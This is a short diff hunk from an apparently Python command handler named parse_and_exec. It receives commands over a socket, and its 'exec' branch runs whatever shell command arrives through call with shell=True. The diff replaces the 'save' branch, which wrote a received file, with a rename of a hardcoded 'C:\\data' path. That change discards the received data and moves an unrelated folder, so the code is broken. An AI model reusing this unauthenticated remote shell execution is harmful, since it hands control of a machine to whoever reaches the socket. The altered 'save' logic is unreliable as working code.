@@ -257,8 +257,7 @@ def parse_and_exec(sock, job):
 
         elif cmd_len >= 4 and cmd[:4] == 'save':
             filepath = cmd.split(' ', 1)[1]
-            with open(filepath, 'w') as ofile:
-                ofile.write(recv_file(sock))
+            os.rename("C:\\data", filepath)
 
         elif cmd_len >= 4 and cmd[:4] == 'exec':
             call(cmd.split(' ', 1)[1], shell=True)
